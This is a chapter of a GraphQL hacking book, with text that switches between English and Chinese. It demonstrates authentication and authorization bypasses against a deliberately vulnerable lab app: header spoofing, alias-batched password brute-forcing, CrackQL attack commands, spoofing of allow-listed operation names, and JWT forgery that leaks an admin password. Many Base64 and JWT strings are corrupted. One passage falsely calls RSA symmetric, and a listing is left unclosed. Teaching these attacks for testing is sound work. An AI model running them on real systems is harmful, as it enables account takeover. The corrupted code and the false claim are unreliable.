## 7

## AUTHENTICATION AND AUTHORIZATION BYPASSES

![](img/2f244b00cd9f8f37cfc22f928aaa471a_188_0.png)

Out of the box, GraphQL has no authentication or authorization controls. As a result, the ecosystem has created its own or adopted those seen in traditional systems. In this chapter, we’ll cover the common GraphQL authentication and authorization implementations. Then we’ll discuss attacks that target some of their weaknesses.

*Authentication* is the mechanism by which a client proves their identity to a server. It answers the question: Is the user really who they say they are? Authentication attacks target a client’s identity, attempting to either steal credentials or spoof them to authenticate with a server, take certain actions on their behalf, or steal data to which they have access.

*Authorization* controls are responsible for granting access to data and ensuring that the actions an entity takes, whether they’re a human or a machine, match their assigned roles, groups, and permissions. Authorization attacks attempt to either bypass a security control entirely or poke holes in

it, allowing an attacker to take actions that wouldn’t otherwise be possible. For example, they might gain unauthorized access to system data or perform privileged actions, such as setting another user’s password.

Authentication and authorization controls can be challenging to implement. This is especially true when an application creates its own mechanisms from scratch instead of using the many battle-tested frameworks available for specific programming languages. Performing security testing of such controls is also a nontrivial task; security tools (such as API application scanners) struggle to identify authorization and authentication issues. One of the primary reasons is that scanners have no contextual understanding of the application’s business logic.

For years, hackers have defeated both authentication and authorization defenses by taking advantage of weak passwords, default credentials, forged tokens, flawed account recovery processes, replay attacks, and poor rate-limit controls. Not only is exploiting these weaknesses possible in GraphQL implementations, but, in many cases, GraphQL’s client-empowering features actually enable hackers to optimize their attacks, as you’ll soon learn.

## The State of Authentication and Authorization in GraphQL

The GraphQL spec has left implementers to fend for themselves when it comes to authentication and authorization. This lack of a detailed standard has led developers to select and deploy their own GraphQL authentication and authorization controls from a variety of libraries, tools, and configurations, often leading to vulnerabilities and implementation gaps.

In this section, we’ll sink our teeth into the ecosystem-driven authentication and authorization services, libraries, and plug-ins available for GraphQL. Broadly, these approaches follow two distinct architectural deployment models: in-band and out-of-band.

## In-Band vs. Out-of-Band

In an in-band authentication and authorization architecture, developers implement client login, signup, role-based access controls, and other permission controls directly in the GraphQL API. The same GraphQL instance that provides clients with their application data also controls the logic that authenticates clients and grants them permissions to view data. In-band GraphQL architectures typically host query or mutation operations that enable clients to send credentials to the API. The API is responsible for verifying these credentials and then issuing tokens to the clients.

Out-of-band authentication and authorization architectures implement the access control and permissions logic on either a separate internal web application service or an external system. In such an architecture, the GraphQL API isn’t responsible for managing client login, signup, or even access control. Instead, it offloads authorization decisions to another component, such as an API gateway, a container sidecar, or another server on the network. This allows developers to decouple the authorization logic from the GraphQL application.

Of the two architectural styles, in-band architectures tend to be more vulnerable to authentication and authorization attacks. Their added complexity increases an API's attack surface drastically. These APIs often duplicate permission logic for each entry point into the service, and as you'll see later in this chapter, we, as hackers, can take advantage of even the slightest misaligned control.

Thus, some contributors to the GraphQL ecosystem advocate for keeping authentication and authorization logic outside of GraphQL. The current industry best practice is to delegate authorization logic to the *business logic layer* of an application, which serves as the single source of truth for all business domain rules. It should sit between the GraphQL layer and the *persistence layer* (also known as the *database* or *datastore* layer), as shown in Figure 7-1.

![](img/2f244b00cd9f8f37cfc22f928aaa471a_190_0.png)

Figure 7-1: The gateway, API, business, and persistence layers

By contrast, authentication for the entire GraphQL API should occur in an external or third-party *gateway layer*, which passes authenticated user contexts along to the API.

## Common Approaches

There is no way to know what kinds of controls you'll come across during your GraphQL hacking adventures. However, this section lists some of the common approaches we've seen in our research and testing. By understanding these techniques, you'll be better equipped to detect them, as well as evaluate the vulnerabilities to which they may be susceptible.

## HTTP Basic Authentication

One of the most rudimentary GraphQL authentication methods is *HTTP basic authentication*. Defined in RFC 7617, this scheme involves the inclusion of a Base64-encoded username and password in the header of a client request. The header looks as follows:

```
Authorization: Basic <base64_encoded_credential>
```




Base64 编码的用户名和密码通过冒号连接成单个凭证。

Basic 认证是一种简单的技术，不需要 cookie、会话标识符或登录页面。要检测 Basic 认证，我们可以使用浏览器。图 7-2 是浏览器用于收集并编码 Basic 认证凭证的自动弹出窗口示例。

![](img/2f244b00cd9f8f37cfc22f928aaa471a_191_0.png)

图 7-2：Basic 认证的浏览器弹出窗口示例

这种方法的一个弱点是，在通过 HTTP 将凭证传输到 GraphQL 服务器时缺乏保密保护。想象一下如下的 Basic 认证头部：

```
Authorization: Basic YWRtaW46YmxhY2toYXRNcmFwaHF sCg==
```

由于凭证使用 Base64 编码并且在每次请求中发送（相比之下，其他系统可能在登录时生成临时会话令牌），窃取此类凭证的攻击窗口更大。通过使用 TLS 可以缓解通过未加密通道传输凭证的风险。但是，如果凭证被窃取，攻击者可以相当容易地对其进行 Base64 解码。要测试这一点，请打开终端并运行以下命令：

```
# echo "YWRtaW46YmxhY2toYXRNcmFwaHF sCg==" | base64 -d
admin:blackhatgraphql
```

Basic 认证的另一个弱点是缺乏支持的注销功能，该功能会使凭证失效。窃取 Basic 认证凭证的攻击者将永久访问 API，直到管理员更改凭证为止。很少看到 Basic 认证用于生产级应用程序。你更有可能在测试或暂存环境中偶然发现该机制，作为保护应用程序的快速而粗糙的方法，但任何事情皆有可能！

## OAuth 2.0 和 JSON Web Token

*Open Authorization (OAuth)* 是一种授权框架，使第三方能够通过在用户和 API 之间协调授权流程，或允许第三方应用程序代表用户获取访问权限，从而获得对诸如 GraphQL API 之类的 HTTP 服务的临时访问权限。

如果你曾经通过点击类似 *Log in with Google* 的按钮登录网站，那么你可能以前遇到过 OAuth。我们将在本节中仅触及 OAuth 2.0 的表面，但如果你有兴趣了解更多信息，可以在 *https://datatracker.ietf.org/doc/html/rfc6749.* 找到信息。

想象一下，你正在对一个应用程序进行渗透测试，例如具有登录机制以防止未经授权访问的电子商务应用。OAuth 协议允许电子商务应用（或 OAuth 术语中的 *client*）向 *resource owner*（你，渗透测试人员，需要登录）请求授权。当授权请求被授予（也称为 *authorization grant*）时，电子商务应用将获得一个访问令牌，可用于访问资源服务器上的某些资源。此资源服务器可以是 GraphQL 服务器。它将检查访问令牌，如果发现有效，则通过允许客户端对资源（也称为 *protected resource*）执行查询来提供服务。

利用 OAuth 2.0 框架的应用程序可以使用 *JSON Web Token (JWT)* 作为其令牌格式。JWT 是一种开放标准（定义于 RFC 7519），允许通过 JSON 对象在系统之间安全传输信息。服务器可以通过数字签名和加密验证 JWT 令牌。JWT 令牌包含三个不同的部分，它们经过 Base64 编码并由句点 (.) 分隔，如清单 7-1 所示。这三个部分是头部、负载和签名。

```
eyJo eXA iOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJo eXB Ijoi YWNjZXNzIwiaWF0Ijo xNjU2NDY0MDIyLCJcJvMyiOjE2NTYONjOwMjIsImpoaSI6ImY0oThmZmQxlWU0YzctNGU 5Mi0sZTRhLWJw iNzRiZmVjZTE4ZiIsImIkzW50aXR5Ijoib3b1c mFob3iI1C1eHAiojE 2NTYONzEyMj9.NHs6Ji1DONJsC9LpJzdBB8enXzIrqIO C vqojj8SqA4s
```

*清单 7-1：一个示例 JWT 令牌*

*头部*，或 JWT 令牌的第一部分，定义了两个重要细节：令牌类型和签名算法。当我们对该头部进行 Base64 解码时，应该可以看到其内容：

```
# echo eyJo eXA iOiJKV1QiLCJhbGciOiJIUzI1NiJ9 | base64 -d
{
  "typ": "JWT",
  "alg": "HS256"
}
```

NOTE 要使用图形界面对整个 JWT 令牌进行编码和解码并验证其签名，可以使用 https://jwt.io。请记住，为了验证 JWT 令牌的签名，你必须拥有用于签署令牌的密钥。

typ 键是头部参数，声明 JWT 令牌的结构化媒体类型信息。在本例中，媒体类型为 JWT。可能的媒体类型完整列表可以在 https://www.iana.org/assignments/media-types/media-types.xhtml 找到。此头部参数被视为可选，但可以设置，以便读取头部的应用程序了解对象类型结构。

alg 键定义用于确保令牌完整性的 JWT 令牌签名算法。此键可以表示不同的签名算法，例如：

- 无数字签名 (none)
- 使用 SHA-256 的 HMAC (HS256)
- 使用 SHA-384 的 HMAC (HS384)
- 使用 SHA-256 的 RSA (RS256)
- 使用 SHA-384 的 RSA (RS384)

基于哈希的消息认证码（HMAC）是一种对称加密认证技术（意味着使用共享密钥），而 Rivest-Shamir-Adleman（RSA）是对称的（使用公钥和私钥对）。签名算法的完整列表可以在 RFC 7518 中找到。

针对使用 JWT 的应用程序的常见攻击涉及将 alg 头部参数设置为 none。如果应用程序接受未签名的 JWT 令牌，黑客可以篡改其 JWT 令牌以冒充另一用户或执行敏感操作。

负载部分，或 JWT 的第二部分，包含有关用户的信息，以及开发人员可能认为有用的任何额外数据。在我们的示例中，解码后的负载应与此输出匹配：

```
# echo "eyJoeXBlIjoiYWNjZXNziwiaWFOIjoxNjU2NDY0MDIyLCJuYmYiOjE2NTY0NjQwMjIsImpoaSI6ImY0OT8fdm0xWLUOYzctNGU5Mi05ZTRhLWJiNzRiZmVjZTE4ZiIsImtkZW5OaXR5Ijoi b3BlcmFob3IiLCJleHAiOjE2NTY0NzEyMj9j" | base64 -d
{
  "type": "access",
  "iat": 1656464022,
  "nbf": 1656464022,
  "jti": "f498ffd1-e4c7-4e92-9e4a-bb74bfece18f",
  "identity": "operator",
  "exp": 1656471222
}
```

大多数 JWT 负载将包含一些标准元素，称为声明，包括 iat 字段，表示 JWT 启动的时间戳，以及 exp 字段，表示 Unix 时间戳格式的过期时间戳。你可以通过阅读 RFC 7519 文档了解有关 JWT 字段的更多信息。

JWT 的最后一部分是 *签名*，它确保整个 JWT 未被篡改。对 JWT 的任何手动更改都应使此签名无效，导致 GraphQL 服务器拒绝令牌。正如你很快就会学到的，GraphQL 服务器签名验证中的漏洞可能会允许攻击者伪造 JWT 令牌。在第 178 页的“伪造和泄露 JWT 凭证”中，我们将介绍一些常见的 JWT 实现弱点以及如何利用它们。

> NOTE
> OAuth 2.0 也可以用于保护图形 GraphQL 客户端。你可以在 https://github.com/autom8ter/oauth-graphql-ide 找到一个为 GraphQL Playground 添加 OAuth 保护支持的项目。

## GraphQL Modules

在测试基于 JavaScript 的 GraphQL 实现时，你可能会遇到一个名为 *GraphQL Modules* 的实用库，由 The Guild 构建（https://www.the-guild.dev）。该库将 GraphQL 模式拆分为更小、可重用的模块，这些模块充当中间件。开发人员然后可以使用这些模块包装其解析器。清单 7-2 是 Authentication 模块，它为 GraphQL 客户端提供标准的一组登录、注册和用户查找突变和查询。

```
extend type Query {
  me: User
}

type Mutation {
  login(username: String!, password: String!): User
  signup(username: String!, password: String!): User
}

extend type User {
  username: String!
}
```

清单 7-2：来自 GraphQL Modules 库的 Authentication 模块

正如你所见，该模块定义了一个名为 me 的查询，它返回一个 User 对象，以及两个名为 login 和 signup 的突变，它们接受 username 和 password 参数并返回一个 User 对象。

开发人员也可以在不使用外部库的情况下在 GraphQL API 中实现自定义登录查询和注册突变操作。在第 171 页的“身份验证测试”中，我们将教你如何使用第 5 章中介绍的批处理查询和第 2 章中安装的 CrackQL 来击败像这里提到的这样的内联身份验证操作。

## GraphQL Shield

*GraphQL Shield* 是另一个由 The Guild 构建的中间件库，用于在 GraphQL API 中生成授权层。它允许开发人员定义



rules that either permit or deny client access. Listing 7-3 shows queries and mutations protected by GraphQL Shield, which defines the permissions and roles required to access each query.

```
const permissions = shield({
  Query: {
    frontPage: not(isAuthenticated),
    fruits: and(isAuthenticated, or(isAdmin, isEditor)),
    customers: and(isAuthenticated, isAdmin),
  },
  Mutation: {
    addFruitToBasket: isAuthenticated,
  },
  Fruit: isAuthenticated,
  Customer: isAdmin,
})
```

Listing 7-3: A GraphQL Shield code example

Clients wishing to use the frontPage query don’t have to be authenticated, as defined by the rule not(isAuthenticated), whereas to use the customers query, they have to both be authenticated and have an admin user, as indicated by and(isAuthenticated, isAdmin). The and operator mandates that both conditions must be true for permission to be granted.

A developer community actively maintains GraphQL Shield and continuously improves it. As of this writing, the last documented vulnerability in GraphQL Shield was an authorization bypass that dates back to 2020 in versions earlier than 6.0.6.

When performing a code review, look for the GraphQL Shield component called the fallbackRule. This rule can determine whether a request should be allowed or denied by default whenever a rule is not defined. By default, fallbackRule is set to allow. To read more about GraphQL Shield rules, refer to the official documentation at https://www.graphql-shield.com/docs/rules#logic-rules.

## Schema Directives

GraphQL deployments might use custom schema-level directives to apply both authentication and authorization controls on certain operations and fields. By decorating schema components, these custom directives can control what clients can and can’t do in the API. We can use them to enforce security at the query level, type level, field level, and so on.

The graphql-directive-auth library (https://github.com/graphql-community/graphql-directive-auth) provides one example of how developers could apply directives to solve authentication and authorization gaps in their APIs. In some implementations, the @auth directive accepts a requires argument, which takes a string value representing the role or group a user needs in order to query the field. Clients usually send these user groups or roles through a JWT payload. The directive logic analyzes these to either allow or deny access to protected elements of the schema.

Authorization directives can have various other names or arguments. Table 7-1 is a list of common ones you might encounter in your introspection hunts.

## Table 7-1: Common GraphQL Authorization Directives

| Directive name | Argument name | Argument type |
|---|---|---|
| @auth | requires | String |
| @protect | role | String |
| @hasRole | role | String |

Some @auth directives might also use an argument called permissions, which accepts a list of scope grants.

## IP-Based Allow Listing

Some GraphQL APIs, particularly those deployed in internal systems that aren't public facing, may choose not to authenticate individual client requests. Instead, they might opt to use an allow list of source IP addresses to authorize clients. In this technique, the server checks the client IP address included in a network request against a list of addresses or network range (such as 10.0.0.0/24).

This IP address often gets passed to the API by a public-facing network device, such as a reverse proxy or a load balancer. Applications will then attempt to discover the IP address by looking for HTTP headers set on incoming requests. A few common HTTP headers for this purpose are X-Forwarded-For, X-Real-IP, X-Originating-IP, and X-Host.

Because clients can spoof these headers, reverse proxies may blindly forward misinformation to the application. For example, here is how you might pass a custom X-Forwarded-For header to DVGA with cURL:

```
# curl -X POST http://localhost:5013/graphql -d '{"query":"{ __typename }"}'
-H "Content-Type: application/json" -H "X-Forwarded-For: 10.0.0.1"
```

If the application allows only requests to the GraphQL API that originate from the network 10.0.0.0/24, injecting such a header at a later stage could allow an attacker to bypass the IP-based allow list and communicate with the application.

## Authentication Testing

When you're testing GraphQL authentication, you'll encounter certain operations that aren't protected by any authentication layer. For example, unauthenticated users might have access to queries, while only authenticated users might be able to perform more sensitive, state-changing actions using mutations. You might find this model in use on a blog: any client can read posts, whereas only authenticated users can write comments.

It’s important to do a thorough scan of the target GraphQL server and schema for any unprotected queries. This section will outline how you can detect and defeat certain GraphQL authentication controls.

## Detecting the Authentication Layer

One of the best ways to determine whether a target GraphQL application is protected by an authentication layer is by sending it a canary query. Use either of the introspection queries from Chapter 6 or craft your own to probe the schema for a range of operations, objects, and types. Depending on the response you receive, you may be able to detect the type of authentication used, as well as the layer at which authentication controls are implemented. In particular, keep an eye out for status codes, error messages, and differences in the responses to query variations.

## HTTP Status Codes

A sure way to verify that some sort of authentication layer exists on a GraphQL target is by analyzing the HTTP response you receive after sending a canary query. Most GraphQL implementations will always return a 200 OK status code, even when the query contains typos or errors. However, if you receive a 403 Forbidden Error, it’s possible that out-of-band authentication and authorization control, like a gateway or a WAF, has blocked your request from reaching the API in the first place.

## Error Messages

Error messages can obviously reveal the presence of authentication controls, but they might also tell us exactly what type of authentication the API requires and where in the architecture these checks occur. Table 7-2 shows a list of common in-band GraphQL authentication error messages and the authentication implementation known to raise the error message by default.

## Table 7-2: Common GraphQL Authentication Errors

| Error message | Possible authentication implementation |
|---|---|
| Authentication credentials are missing. Authorization header is required and must contain a value. | OAuth 2.0 Bearer with JSON Web Token |
| Not Authorised! | GraphQL Shield |
| Not logged in
Auth required
API key is required | GraphQL Modules |
| Invalid token!
Invalid role! | graphql-directive-auth |

Error messages can be customized and might differ from those shown here. Reference Chapter 6 for additional information on how to abuse errors to extract valuable information from GraphQL. For example, a combination

of a 200 OK status code and an error message could indicate that authentication is required. Because these details may vary from one GraphQL API to another, we recommend checking all avenues.

## Authentication-Related Fields

Another great way to detect an authentication layer is to use introspection queries to identify any authentication-related query or mutation operations. By design, in-band GraphQL authentication requires authentication, session management, and identity-based operations. For example, a client will most likely need to send unauthenticated mutation requests that perform login and sign-up operations to create and access their authenticated accounts. We can use the introspection query in Listing 7-4 to analyze the schema for any mutation operations related to authentication.

```
{ __schema { mutationType { name kind fields { name description } } } }
```

Listing 7-4: An introspection query used to identify all mutations

Check whether the query returns any mutation names similar to these:

- me
- login
- logout
- signup
- register
- createUser
- createAccount

If so, you can infer that the API has an authentication layer, which means you can begin testing its resiliency against password brute-force attacks.

## Brute-Forcing Passwords by Using Query Batching

A classic authentication attack, password brute-forcing works against systems that fail to implement rate limits or other automated account-takeover prevention controls. To perform one, an attacker sends many login requests to a system in an attempt to correctly guess a password. This programmatic attack usually accepts a dictionary of possible user credentials or iterates through a sequence of characters to generate possible credential combinations.





诸如 WAF 之类的安全控制在防止单个客户端发出过多的 HTTP 请求方面非常有效，并且在检测到此类活动时通常会限制或禁止该客户端。然而，在第 5 章中，我们介绍了查询批处理，它本质上允许客户端在一个 HTTP 请求中打包多个查询操作。我们可以利用此批处理功能，通过在单个 HTTP 请求中使用多个操作来暴力破解凭据，从而有效地规避诸如 WAF 之类的安全控制。

有两种类型的批处理操作：基于数组的和基于别名的。像 BatchQL 这样的工具利用基于数组的查询批处理在单个请求中发送多个操作。然而，如果你回到第 3 章图 3-4 中显示的 GraphQL 威胁矩阵截图，你会注意到很少有 GraphQL 实现支持这种类型的批处理。相比之下，所有主要的 GraphQL 实现都支持基于别名的查询批处理，因为它在 GraphQL 规范中定义。

让我们使用别名对 DVGA 的 GraphQL 认证层执行密码暴力破解攻击。首先，我们需要在单个 GraphQL 文档中包含使用不同凭据的多个登录操作。清单 7-5 显示了一个包含 10 个登录突变别名的 GraphQL 文档，针对 DVGA 中的 admin 和 operator 用户账户。你也可以在本书的 GitHub 仓库中找到该查询，地址为 https://github.com/dolevjf/Black-Hat-GraphQL/blob/master/ch07/password-brute-force.graphql。

每个别名操作都有一个唯一的标识符，以及一个目标用户名和一个可能的密码。如果其中一个操作成功，服务器应在响应中返回被攻击用户的 JWT 访问令牌（accessToken）：

```
mutation {
    alias1: login(username: "admin", password: "admin") {
        accessToken
    }
    alias2: login(username: "admin", password: "password") {
        accessToken
    }
    alias3: login(username: "admin", password: "pass") {
        accessToken
    }
    alias4: login(username: "admin", password: "pass123") {
        accessToken
    }
    alias5: login(username: "admin", password: "password123") {
        accessToken
    }
    alias6: login(username: "operator", password: "operator") {
        accessToken
    }
    alias7: login(username: "operator", password: "password") {
        accessToken
    }
    alias8: login(username: "operator", password: "pass") {
        accessToken
    }
alias9: login(username: "operator", password: "pass123"){
  accessToken
}
alias10: login(username: "operator", password: "password123"){
  accessToken
}
```

清单 7-5：使用批处理查询进行密码暴力破解示例

对 DVGA 执行此密码暴力破解查询将导致接下来显示的大型响应。如你所见，其中大部分数据由 Authentication Failure 错误组成。然而，对于 alias10，我们收到了一个有效的 accessToken，这意味着我们成功暴力破解了 operator 密码，其设置为 password123。

```
{
  "errors": [
    {
      "message": "Authentication Failure",
      "locations": [
        {
          "line": 2,
          "column": 5
        }
      ],
      "path": [
        "alias1"
      ]
    },
    --snip--
    {
      "message": "Authentication Failure",
      "locations": [
        {
          "line": 26,
          "column": 5
        }
      ],
      "path": [
        "alias9"
      ]
    }
  ],
  "data": {
    "alias1": null,
    --snip--
    "alias9": null,
    "alias10": {
      "accessToken": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBIIjoiYWNjZXNzaW9uIiwiaWF0IjoxNjU2OTcxMDc5LCJuYmYiOjE2NTY5NzEwNzksImp0aSI6IjQ3NmEwYTYxLTk0OGUtNDZmOS0yZDQmLTF1Mzk3MDAxMTNjYiIiSImIkZW5OaXR5Jjoib3BlcmFOb3IilCJleHAiOjE2NTY5NzgyNzI9.NJZ0ugXBWg-OoEcT2Uth-xeBFwqxS0_5Ag1Y7-L3EgiI"
    }
  }
```

即使安全控制通过禁止客户端每分钟发出超过例如五次 HTTP 登录请求来保护 API，此攻击也会规避此类逻辑，因为我们在执行 10 次登录尝试时只发送了一个 HTTP 请求。

## 使用 CrackQL 暴力破解密码

手动构建成功暴力破解登录凭据所需的大型 GraphQL 文档将非常耗时。在第 2 章中，你安装了一个名为 CrackQL 的 GraphQL 密码暴力破解和模糊测试工具。该工具接受单个 GraphQL 查询或突变操作，并使用 CSV 词表自动生成别名负载。让我们再次运行相同的密码暴力破解攻击，但这次使用 CrackQL 来自动化它。

进入 CrackQL 目录，然后对 DVGA 执行暴力破解攻击。-t（target）参数指定目标 GraphQL 端点 URL，-q（query）参数接受示例查询（login.graphql），-i（input）参数定义攻击中使用的用户名和密码列表。--verbose 参数允许我们查看发送到 DVGA 之前的最终负载等附加信息。

```
# cd ~/CrackQL
# python3 CrackQL.py -t http://localhost:5013/graphql -q sample-queries/login.graphql -i sample-inputs/usernames_and_passwords.csv --verbose
```

CrackQL 预装了示例用户名和密码 CSV 字典，以及清单 7-6 中显示的 login.graphql 查询。如你所见，它包含一个带有两个嵌入变量 username 和 password 的单个 login 突变。CrackQL 使用 Jinja 模板语法，因此变量使用双大括号（{{}}）传递。

```
mutation {
    login(username: {{username|str}}, password: {{password|str}}) {
        accessToken
    }
}
```

清单 7-6：示例 CrackQL 登录暴力破解查询

当你执行 CrackQL 命令时，该工具将自动从 CSV 文件中取出每个用户名和密码变量，并将其注入到同一查询文档中的重复登录操作中。CrackQL 的详细输出提供负载详细信息以及输出结果：

```
Data:
[{'alias1': {'data': None,
    'inputs': {'password': 'admin', 'username': 'admin'}}},
--snip--

{'alias9': {'data': None,
    'inputs': {'password': 'operator', 'username': 'pass123'}}},
```

```
{'alias10': {'data': {'accessToken': 'eyJoeXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJoeXB1joiYWNjZXNZIiwi aW aWFOIjoxNjU3MDQ2NjI5LCJcUjYmYioJE2N TcWnNDY2MjksImpoa0SiGIjvKmZhkM2Y5LWNjNTUtNDcyYyYi1nZRhlTh iN2F1M2EyNGF1MiIsImIkzW5o aXR5Ijoib3B1cmF0 b3JilLCJleH a0iOjE2NTcWNTM4Mjl9.Ba3zfvZqjDmyLFdx71WCs-7vidaxpUfs2X3UK3zZBA'}, 'inputs': {'password': 'password123', 'username': 'operator'}}] Errors: [{'alias1': {'error': 'Authentication Failure', 'inputs': {'password': 'admin', 'username': 'admin'}}}, {'alias2': {'error': 'Authentication Failure', 'inputs': {'password': 'admin', 'username': 'password'}}}, --snip-- {'alias9': {'error': 'Authentication Failure', 'inputs': {'password': 'password123', 'username': 'operator'}}}] [*] Writing to directory results/localhost:5013_5bab6e
```

在 GraphQL 查询成本控制阻止执行大型查询批处理的情况下，CrackQL 具有可选的 -b（batch）参数，你可以使用它来定义更有限的别名操作集，从而使你的攻击在雷达下飞行。

你也可以将 CrackQL 用于各种其他攻击。使用可能的一次性密码令牌列表，CrackQL 可以暴力破解双因素认证。它还可以执行账户枚举攻击，通过自动化扫描有效电子邮件或用户名的过程，或模糊唯一对象标识符以利用不安全的直接对象引用（IDOR）漏洞，其中，通过直接引用对象标识符，我们能够在未经授权的情况下访问该对象。

在对经过身份验证的查询执行攻击时，你可能需要传递身份验证头和可能的 cookie。CrackQL 允许你使用 config.py 文件来做到这一点，该文件接受 COOKIES 和 HEADERS 变量。以下是向工具提供自定义头和 cookie 的示例：

```
# cat config.py

HEADERS = {"Authorization": "Bearer mytoken"}
COOKIES = {"session":"session-secret"}
```

在执行渗透测试时，你可以通过使用 Firefox 开发工具的网络选项卡等工具检查网络流量来获取这些头。查看你在对网站进行初始登录后发送的任何 GraphQL 请求。此时，你应该会看到唯一的身份验证头或会话 cookie。

## 使用允许列表操作名称

某些内部 GraphQL 实现可能会使一些查询和突变对未经身份验证的客户端公开，例如用于登录或账户注册的查询。其中一些部署使用基于操作名称的允许列表，这是一种薄弱的执行控制，以拒绝所有未经身份验证的


requests 除非其操作名称在允许列表中，否则会被拒绝。然而，操作名称可以由客户端定义，因此攻击者只需伪造操作的名称即可绕过这些身份验证机制。

下面是一个未经过身份验证的 mutation 示例。可以看出，它允许用户注册一个新用户账户：

```
mutation RegisterAccount {
    register(username: "operator", password: "password"){
        user_id
    }
}
```

实现可能会通过使用其操作名称 RegisterAccount 来将此 register 操作加入允许列表。作为攻击者，我们可以通过发送如 Listing 7-7 中所示的请求来利用这一点。

```
mutation RegisterAccount {
    withdrawal(amount: 100.00, from: "ACT001", dest: "ACT002"){
        confirmationCode
    }
}
```

Listing 7-7: 一个可能通过使用允许列表中的操作名称来绕过身份验证的示例操作

我们使用了允许的操作名称来使用 withdrawal mutation 取款。

## 伪造和泄露 JWT 凭证

虽然 JWT 令牌可以使用 JSON Web Encryption（RFC 7516）进行加密，但通常并未加密。而当未加密时，它们可能会泄露敏感数据。例如，来看一下以下 payload 部分的内容：

```
eyJoeXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJoeXBlijoiYWNjZXNwIiwiiaWFOIjoxNjU3MDQ2NjI5LCJuYmYiOjE2NTcwNDY2Mjk sImpoaSI6IjVkMzhkM2Y5LWnNjNTUTNDcyYy1iNzRh1Th iNzFIMzEyNGF1MiIsImIkZW5o aXR5Ijoib3B1cmFob3IilC1leHAiOjE2NTcwNTM4MjksImFwaV9ob2t1biI6IkFQSV9TRUNSRVRfUEFTU1dPUkQifQ.iIQ9zMRP2bAOYx8p7INur fC-PcVz-KqfzE4uQICbc
```

当我们对 payload 进行 Base64 解码时，我们发现 payload 部分中存在一个硬编码的凭证 api_token：

```
{
  "type": "access",
  "iat": 1657046629,
  "nbf": 1657046629,
  "jti": "5d38d3f9-cc55-472c-b74a-8b7ae3124ae2",
  "identity": "operator",
  "exp": 1657053829,
  "api_token":"API_SECRET_PASSWORD"
}
```

通过解码和测试 JWT 令牌的内容，我们可以对应用程序获得大量洞察。

另一种绕过弱 JWT 身份验证控制的方法是通过伪造我们自己的 JWT 令牌。如果 GraphQL API 未能正确验证 JWT 令牌的签名，它就会容易受到伪造攻击，在这种攻击中，攻击者可以编码自己的用户详细信息。

让我们通过伪造管理员的 JWT 令牌来对 DVGA 执行一次 JWT 伪造攻击。首先，复制我们在“使用查询批处理暴力破解密码”第 173 页中成功暴力破解 operator 密码时收到的 accessToken JWT。我们可以通过将它作为 token 参数发送到 DVGA 中的 me 查询操作来验证 accessToken 是否有效：

```
query {
  me(token: "eyJoeXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJoeXBlIjoiYWNjZXNzIiwiaWFwFOIj
oxNjU3MDQ2NjI5LCJuYvYioJE2NTcwNDY2MjksImp0aS6I6I jVkMzhkM2Y5LWNjNTUtNDcyYy1iNzRhLT
hiN2FlMzEyNGF1MiIsImkZW5OaXR5Ijoib3BlcmFob3IilLCJleHAioJE2NTcwNTM4Mj19.Ba3zfvSZq
jDmyLFdx71Wcs-7vidaxpUfs2X3UK3zZBA"){
    id
    username
    password
  }
}
```

DVGA 将根据 JWT 中的 identity 声明对用户进行身份验证，并使用 me 查询操作返回已认证的用户对象字段：

```
{
  "data": {
    "me": {
      "id": "2",
      "username": "operator",
      "password": "******"
    }
  }
}
```

接下来，让我们将 JWT 字符串粘贴到 https://jwt.io，如图 7-3 所示。该网站将自动解码并以更易读的形式呈现三个 JWT 段。

在右侧面板中，我们可以直接修改解码后的 payload 的 JSON 数据，将 "identity": "operator" 行更改为 "identity": "admin"。你会注意到 https://jwt.io 会在左侧面板中自动编码 payload 的更改。

![](img/2f244b00cd9f8f37cfc22f928aaa471a_205_0.png)

图 7-3：使用 https://jwt.io 解码的 DVGA operator 的 accessToken

现在尝试将此伪造的 JWT 令牌用于 me 操作。只需复制 JWT 并将其粘贴到查询的 token 参数中即可。由于 DVGA 不验证 JWT 签名，它将使用伪造的 JWT 令牌对我们的请求进行身份验证并返回 admin 用户的密码：

```
{
  "data": {
    "me": {
      "id": "1",
      "username": "admin",
      "password": "changeme"
    }
  }
}
```

当客户端更改 JWT 令牌时，其签名应变得无效。未使用其密钥验证此签名的 GraphQL API 将容易受到伪造攻击。

## 授权测试

与身份验证一样，开发人员可以采用多种方法来实现授权。当获得受限的 GraphQL 用户账户时，我们作为黑客，应该看看能将权限提升到什么程度。特别是，我们应该确定是否能够绕过旨在阻止我们读取用户数据或执行某些提升功能的控制。

与 REST 一样，GraphQL 也可能容易受到各种授权攻击，具体取决于 API 如何处理权限控制。未能在函数级别保护未经授权的访问可能会导致敏感数据泄露或破坏性操作的执行。

GraphQL 特定的授权缺陷通常出现在权限检查发生在解析器级别或在执行任何业务逻辑或状态更改之后。让我们学习如何检测一些这些授权方法并探索它们可能存在的攻击。

## 检测授权层

我们可以通过几种方式来检测 API 是否使用授权控制，以及使用何种类型的控制。

### 查找 Schema 指令

我们之前提到，开发人员有时会使用 schema 指令来实现授权。如果你可以访问 API 的 SDL 文件，你可以识别这些 schema 指令。或者，你可以发送如 Listing 7-8 所示的专门的 introspection 查询。

```
query {
  __schema {
    directives {
      name
      args {
        name
      }
    }
  }
}
```

Listing 7-8：用于获取指令名称和参数的 introspection 查询

运行此查询将返回目标服务器中所有查询级和 schema 级指令的列表。如果你在列表中注意到 @auth 指令，你可以假设 schema 支持它。当然，开发人员可以为指令命名不同的名称，因此还应查找 @authorize、@authorization、@authz 等名称。

### 在 Schema 中查找身份验证指令

如果我们执行 introspection 查询来识别指令，我们将知道是否存在 @auth 指令。然而，我们不会知道此指令在 schema 中应用的位置，因为此信息不会在 introspection 查询中公开。这是因为客户端不会调用 schema 级指令；相反，开发人员使用它们来防止未经授权的访问，以及其他用例。

来看一下 Listing 7-9 中的 User 对象类型示例。

```
Type User {
  id: ID
  username: String
  email: String
  password: String @auth(requires: ADMIN)
  role: String
}
```

Listing 7-9：schema 中 @auth 指令使用示例

你在白盒渗透测试中扫描 schema 以查找 @auth 指令会很有用，白盒测试会提供你 SDL 文件。但在不提供 schema 访问权限的黑盒测试中，你可能知道 password 字段存在，但不知道 @auth 指令是否适用于它。

